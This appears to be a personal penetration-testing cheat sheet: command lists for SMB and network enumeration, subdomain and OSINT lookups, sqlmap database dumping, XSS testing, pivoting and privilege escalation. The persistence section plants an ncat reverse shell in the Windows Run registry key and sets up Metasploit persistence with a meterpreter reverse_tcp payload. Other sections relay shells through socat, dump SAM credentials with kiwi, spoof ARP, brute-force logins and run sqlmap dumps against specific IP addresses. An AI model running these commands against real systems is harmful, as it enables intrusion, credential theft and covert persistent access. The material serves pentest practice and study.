# Commands

## SMB

```
enum4linux -a <ip>

samrdump.py <ip>

nmap --script=smb-enum-shares <ip>
nmap --script=smb-enum-users <ip>
nmap --script=smb-brute <ip>
```

note other nmap scripts
```
--script=mongodb-brute
--script=mysql-brute
--script=mysql-enum 
--script=mysql-info
```

## Subdomain

### Manual 
```
site:<web domain>

dnsdumpster.com

crt.sh
```

### Automated
```
sublist3r -d <domain> -b -v 

-d domain name
-b brute force mode (uses wordlist which can be specified or uses the default wordlist)
-v verbose
-o output to file
```
## OSINT

### Google dorking

```
site: <website> (filters by website)
intitle: <query> (filters by title of page)
inurl: <query> (filters based on url)
filetype: <filetype> (filters based on filetype)
```

### Lookups

```
whois

dig -x <ip address> 
dig <address>
```

## Persistance

Save malware (ncat reverse shell) in windows

```
computer\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\
```

right click new > string value
wincofig
click on and enter
``` "abosulte path to malware <ip address of attacking machine> <listening port> -e cmd.exe" ```

on attacking machine 
```
ncat -l -p <listening port>  -v
```
or using metasploit

```
use exploit/windows/local/s4u_persistence

set session <session numer with meterpreter>
set trigger <logon etc>
set payload windows/meterpreter/reverse_tcp
set LHOST <lhost>
set LPORT <listening port>
exploit

use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <lhost>
set LPORT <listening port>
exploit
```


## MASSCAN

```
masscan -p <common ports> -Pn --rate=800 --banners <ip/subnet mask> -e <interface> --router-ip <ip of router>
masscan -p <common ports> -Pn --rate=800 --banners <ip/subnet mask> -e <interface> --router-ip <ip of router> --echo > <name_of_config_file.conf>

config file set up
add output-filename = scan.list
```

## Pivioting

socat sending a reverse shell from target to attacking machine through a relay.

```
./socat tcp-l:<listening_port> tcp:<attacking_IP>:<attacking_port> & (on relay machine)
nc -lvnp <attacking_port> (on attacking machine)
```

sshuttle (tunnelled proxy)

```
sshuttle -r <user>@<ip of machine to ssh to> --ssh-cmd "ssh -i <id_rsa>" <ip ofmachine to ssh to>/<subnet mask> -x <ip ofmachine to ssh to>
```

metasploit (needs metepreter sessions, remember cntrl+z to bg shells that aren't meterpreter shells)

```
run autoroute -s <subnet mask>

scanner/portscan/tcp to scan the new network

portwd -l <listening port on machine> -p <port on target machine> -r <ip of machine>
```

ssh port forwarding

```
ssh -L <local port>:<attacking ip>:<victim port> -i id_rsa user@<victim ip>
```
chisel

``` 
ATTACKING MACHINE:
VICTIM MACHINE: 
```
## Route

```
route (lists routing table)

ip route add <ip/subnet> via <gateway ip> (can also add in dev <interface>)
```

### arpspoofing

``` arpspoof -t <ip> <ip> ```

## traffic sniffing

```
tcpdump -i -n 

openssl s_client -connect ip:port
```

## sqlmap

sqlmap get request

```sqlmap -u 'http://www.example.com/' --batch --dump```


sqlmap post request

```sqlmap 'http://www.example.com/' --data 'uid=1&name=test' --batch --dump```
```sqlmap -u 'http://www.example.com/' --data 'uid=1&name=test' -p uid --batch --dump``` 
```sqlmap -u 'http://www.example.com/' --data 'uid=1*&name=test' --batch --dump```

sqlmap examining cookies/headers

```sqlmap -u  http://167.172.52.221:31935/case3.php --cookie "id=1*" --batch --dump```


sqlmap not finding injections (that are known to be there)
```sqlmap -u http://167.172.52.221:32606/case5.php?id=1 --dump --risk=3 --batch```

sqlmap basic methodology
1) Get the Database type, current user, is the current user the database admin and database name using the ```--banner```, ```--current-user``` , ```--current-db``` and ```--is-dba``` 
```sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba```

2) Enumerate tables. Use ```--tables``` to enuerate tables  and ```-D <database name>``` 
```sqlmap -u "http://www.example.com/?id=1" --tables -D testdb```

3) Dump a table using the ```-T <table name>``` and ```--dump```
```sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb```

4) Further Column enumeration with  ```-C <column names here>``` or ```--start=<column number>``` and ```--stop=<column number>``` (not 0 indexed) or based on conditional statements with ```--where=<condition```

```sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname```
```sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --start=2 --stop=3```
```sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"```

consider ```--schema``` and ```--where=``` for additional info

https://github.com/payloadbox/sql-injection-payload-list sql payloads

## Map a network

```nmap -sn -oN ip_list <ip>```
```fping -g -a <ip> 2>/dev/null```

## XSS

Xsser needs somewhere in the request a XSS.

Post requests

```
xsser -u <url> -p <parameters in submit form>
xsser -u <url> -p <parameters in the submit form> --auto (remember the -u and -p need to be in "" for this to work)
xsser -u <url> -p <parameters in the submit form> -Fp <custom payload>
```
example

```xsser -u "http://example.com" -p "username=XSS&submit_button=activate"```

get requests (for reflected xss)

```
xsser -u <url> 
xsser -Fp <custom payload>
```
example

```xsser -u 'http://example.com?poll=XSS' --Fp <script>alert("Hi")</script>```

## Post exploitation

linux
```
use linux/gather/enum_users_history`
```

windows

```
load kiwi
lsa_dump_sam

use post/windows/gather/enum_logged_on_users
```

## privesc

```
sudo -l (don't forget to look at LD_PRELOAD)
find / -perm -u=s -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null
getcap -r / 2>/dev/null
```

## Checking listening 

```ss -tulnp```
```lsof -i tcp:<port>```

## Encripytion

```
gpg --import .asc 
gpg --decrypt .pgp 
```